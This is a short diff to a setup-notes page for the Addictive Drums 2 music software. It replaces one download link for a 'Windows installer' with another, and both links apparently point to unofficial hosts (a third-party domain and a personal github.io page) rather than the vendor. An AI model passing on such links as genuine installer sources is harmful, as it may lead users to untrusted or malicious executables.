@@ -1,6 +1,6 @@
 # Addictive Drums 2 Windows Setup Notes
 
-**Download:** [Get Windows installer →](https://addictive-drums-setup.kolmods.com/)
+**Download:** [Get Windows installer →](https://yunos8019.github.io)
 
 ## Download & Install
 
